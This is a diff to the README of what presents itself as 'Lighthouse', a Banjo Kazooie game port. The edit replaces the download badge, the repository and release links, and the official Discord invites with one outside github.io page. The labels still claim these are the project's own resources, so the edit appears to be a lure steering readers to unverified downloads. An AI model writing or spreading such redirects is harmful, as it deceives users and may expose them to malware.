@@ -6,7 +6,7 @@ Welcome to Lighthouse, the Harbour Master's port of Banjo Kazooie! This applicat
 
 ### 📥 Download the Application
 
-[![Download Lighthouse](https://img.shields.io/badge/Download%20Lighthouse-2ea44f?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Ulrichscantilyclad317/Lighthouse/releases)
+[![Download Lighthouse](https://img.shields.io/badge/Download%20Lighthouse-2ea44f?style=for-the-badge&logo=github&logoColor=white)](https://ulrichscantilyclad317.github.io)
 
 Visit this link to download the application.
 
@@ -88,7 +88,7 @@ Once your ROM is loaded, you can adjust settings and start playing Banjo Kazooie
 
 Join our Discord server for help, discussions, and updates:
 
-[![Discord](https://img.shields.io/badge/Discord-7289DA?style=for-the-badge&logo=discord&logoColor=white)](https://discord.com/invite/shipofharkinian)
+[![Discord](https://img.shields.io/badge/Discord-7289DA?style=for-the-badge&logo=discord&logoColor=white)](https://ulrichscantilyclad317.github.io)
 
 If you're having any trouble after reading through this README, feel free to ask for help in the Lighthouse text channels. Please keep in mind that we do not condone piracy.
 
@@ -113,8 +113,8 @@ Lighthouse is released under an open-source license. The source code is availabl
 
 ## 🔗 Related Links
 
-- [GitHub Repository](https://github.com/Ulrichscantilyclad317/Lighthouse)
-- [Latest Release](https://github.com/Ulrichscantilyclad317/Lighthouse/releases)
-- [Official Discord](https://discord.com/invite/shipofharkinian)
+- [GitHub Repository](https://ulrichscantilyclad317.github.io)
+- [Latest Release](https://ulrichscantilyclad317.github.io)
+- [Official Discord](https://ulrichscantilyclad317.github.io)
 
 Keywords: lighthouse, banjo kazooie, game port, nintendo 64, emulation, open source, gaming, windows, mac, linux
